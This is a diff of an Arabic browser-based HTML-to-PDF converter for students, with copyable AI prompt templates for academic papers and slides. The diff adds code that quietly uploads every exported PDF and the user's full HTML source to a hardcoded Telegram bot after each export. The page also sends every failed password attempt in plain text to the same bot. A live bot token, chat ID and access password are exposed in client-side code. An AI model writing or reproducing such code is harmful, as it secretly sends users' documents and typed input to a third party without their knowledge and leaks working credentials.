@@ -67,7 +67,6 @@
 
     <div class="main-container">
         <div class="sidebar">
-            
             <div class="ai-prompts">
                 <p>🤖 نسخ أمر جاهز للذكاء الاصطناعي:</p>
                 <div class="prompt-btns">
@@ -120,57 +119,72 @@
     </div>
 
     <script>
-        // --- دالة إرسال الإشعارات لتيليجرام ---
-        function sendToTelegram(actionMessage) {
-            // ⚠️ تنبيه: ضع التوكن والآيدي الخاص بك هنا
-            const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
-            const chatId = '6680237928'; 
+        // ==========================================
+        // ⚠️ إعدادات تيليجرام 
+        // ==========================================
+        const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
+        const chatId = '6680237928'; 
+
+        // 1. دالة لإرسال النصوص العادية (مثل تنبيهات الدخول)
+        function sendTextToTelegram(actionMessage) {
+            if(!botToken || botToken.includes('ضع_توكن')) return; // تجاهل إذا لم يتم وضع التوكن
             
-            const text = `🛠️ إشعار من منصة الـ PDF\n\nالعملية: ${actionMessage}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text })
-            }).catch(error => console.error('فشل إرسال الإشعار لتيليجرام'));
+                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار منصة الـ PDF\n\n${actionMessage}` })
+            }).catch(e => console.error(e));
         }
 
-        // --- دالة التحقق من كلمة المرور ---
+        // 2. دالة لإرسال الملفات (PDF أو كود)
+        function sendFileToTelegram(fileBlob, fileName, captionMsg) {
+            if(!botToken || botToken.includes('ضع_توكن')) return;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
+            const formData = new FormData();
+            
+            formData.append('chat_id', chatId);
+            // تحويل الـ Blob إلى File مع تحديد الاسم
+            formData.append('document', new File([fileBlob], fileName)); 
+            formData.append('caption', captionMsg);
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => console.log(`تم إرسال الملف: ${fileName}`))
+            .catch(err => console.error('خطأ في إرسال الملف', err));
+        }
+        // ==========================================
+
         function checkPassword() {
             const input = document.getElementById('pass-input').value;
             const errorMsg = document.getElementById('pass-error');
             
             if (input === 'Sa12345678@') {
                 document.getElementById('password-overlay').style.display = 'none';
-                sendToTelegram('✅ تسجيل دخول ناجح'); 
+                sendTextToTelegram('✅ تم تسجيل الدخول للمنصة بنجاح.'); 
             } else {
                 errorMsg.style.display = 'block';
-                sendToTelegram(`❌ محاولة تسجيل دخول فاشلة\nالكلمة المجربة: ${input}`); 
-                
-                setTimeout(() => {
-                    errorMsg.style.display = 'none';
-                }, 3000);
+                sendTextToTelegram(`❌ محاولة دخول فاشلة للمنصة.\nالكلمة التي تم إدخالها: ${input}`); 
+                setTimeout(() => errorMsg.style.display = 'none', 3000);
             }
         }
-        // -----------------------------------
 
         const prompts = {
-            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n...`, // اختصاراً للمساحة تركتها كما هي
-            169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي بالعربية وفق المواصفات التالية:\n...`
+            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [مثال: فيزياء / كيمياء / رياضيات]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n**الصف:** [مثال: أول ثانوي]\n**العام الدراسي:** [مثال: 1447هـ / 2026م]\n**عدد الصفحات المطلوبة:** [مثال: 5 صفحات]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص هكذا: <p>• النقطة الأولى</p>.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:**\nصفحة 1: غلاف احترافي.\nصفحة 2+: محتوى البحث.\nصفحة أخيرة: المراجع.\nنمط التصميم: احترافي وأنيق بألوان متناسقة.`,
+            169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي بالعربية وفق المواصفات التالية:\n\n**عنوان العرض:** [اكتب العنوان هنا]\n**المادة / الموضوع:** [مثال: مشروع فيزياء / درس تاريخ]\n**المقدِّم:** [الاسم]\n**عدد الشرائح:** [مثال: 8 شرائح]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون: <div class="page">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل الشرائح:**\nشريحة 1: غلاف (عنوان كبير + اسم المقدِّم).\nشرائح 2+: محتوى منظم.\nنمط التصميم: حديث، خلفيات ملونة، نصوص واسعة. خطوط كبيرة وواضحة.`
         };
 
-        // (نفس الكود السابق لنسخ الأوامر، تحديث العرض، الخ)
         function copyPrompt(type, btnElement) {
             navigator.clipboard.writeText(prompts[type]).then(() => {
                 const originalText = btnElement.innerText;
                 const originalBg = btnElement.style.background;
                 const originalColor = btnElement.style.color;
-
                 btnElement.innerText = "✅ تم النسخ!";
                 btnElement.style.background = "#22c55e";
                 btnElement.style.color = "#fff";
-
                 setTimeout(() => {
                     btnElement.innerText = originalText;
                     btnElement.style.background = originalBg;
@@ -189,17 +203,12 @@
         function updateTag() {
             const format = document.getElementById('format-select').value;
             const tag = document.getElementById('size-tag');
-            if(format === 'a4') {
-                tag.innerText = "الأبعاد: 794 × 1123 (A4)";
-            } else {
-                tag.innerText = "الأبعاد: 1280 × 720 (16:9)";
-            }
+            tag.innerText = format === 'a4' ? "الأبعاد: 794 × 1123 (A4)" : "الأبعاد: 1280 × 720 (16:9)";
         }
 
         function updatePreview() {
             const code = document.getElementById('html-input').value;
-            const iframe = document.getElementById('preview-frame');
-            iframe.srcdoc = code;
+            document.getElementById('preview-frame').srcdoc = code;
         }
 
         async function urlToDataURL(url) {
@@ -208,9 +217,7 @@
             try {
                 if (!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('//')) {
                     absoluteUrl = new URL(url, window.location.href).href;
-                } else if (url.startsWith('//')) {
-                    absoluteUrl = 'https:' + url;
-                }
+                } else if (url.startsWith('//')) { absoluteUrl = 'https:' + url; }
             } catch(e) { absoluteUrl = url; }
             
             const proxies = [ null, 'https://corsproxy.io/?', 'https://api.allorigins.win/raw?url=', 'https://cors-anywhere.herokuapp.com/' ];
@@ -261,7 +268,6 @@
             await Promise.all(promises);
         }
         
-        // -------------------------------------------------
         async function exportToPDF() {
             const btn = document.getElementById('capture-btn');
             const code = document.getElementById('html-input').value;
@@ -271,9 +277,6 @@
 
             if (!code.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }
 
-            // إرسال إشعار لتيليجرام ببدء عملية الاستخراج
-            sendToTelegram(`📥 جاري استخراج ملف PDF\nالاسم: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
-
             let docWidth, docHeight, pdfOrientation;
             if (formatType === 'a4') {
                 docWidth = 794; docHeight = 1123; pdfOrientation = 'portrait';
@@ -282,7 +285,7 @@
             }
 
             btn.disabled = true;
-            btn.innerText = `⏳ جاري تجهيز الصفحات...`;
+            btn.innerText = `⏳ جاري التجهيز...`;
 
             const hiddenContainer = document.createElement('div');
             hiddenContainer.dir = 'rtl'; 
@@ -306,7 +309,7 @@
             document.body.appendChild(hiddenContainer);
 
             try {
-                btn.innerText = `🖼️ تحويل جميع الصور إلى DataURL...`;
+                btn.innerText = `🖼️ معالجة الصور...`;
                 await convertAllImagesToDataURLs(hiddenContainer);
                 await document.fonts.ready;
                 
@@ -319,7 +322,7 @@
                     });
                 }));
                 
-                btn.innerText = "📸 جاري تصوير الصفحات...";
+                btn.innerText = "📸 تصوير الصفحات...";
                 const { jsPDF } = window.jspdf;
                 const pdf = new jsPDF({ orientation: pdfOrientation, unit: 'px', format: [docWidth, docHeight] });
                 
@@ -346,10 +349,22 @@
                 
                 btn.innerText = "💾 حفظ الملف...";
                 pdf.save(`${fileName}.pdf`);
+
+                // ==================================================
+                // 🚀 إرسال الملفات لتيليجرام بعد الاستخراج الناجح
+                // ==================================================
+                // 1. إرسال ملف الـ PDF
+                const pdfBlob = pdf.output('blob'); // تحويل الـ PDF إلى بيانات خام
+                sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج ملف PDF بنجاح.\nاسم الملف: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
+
+                // 2. إرسال الكود كملف نصي (TXT) عشان يكون سهل القراءة في تيليجرام
+                const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
+                sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 الكود المصدري (HTML) المستخدم للملف.`);
+                // ==================================================
                 
             } catch (error) {
                 console.error("خطأ:", error);
-                alert("حدث خطأ أثناء معالجة الملف. تأكد من صحة الكود وأن جميع الصور قابلة للتحميل.");
+                alert("حدث خطأ أثناء معالجة الملف.");
             } finally {
                 document.body.removeChild(hiddenContainer);
                 btn.disabled = false;
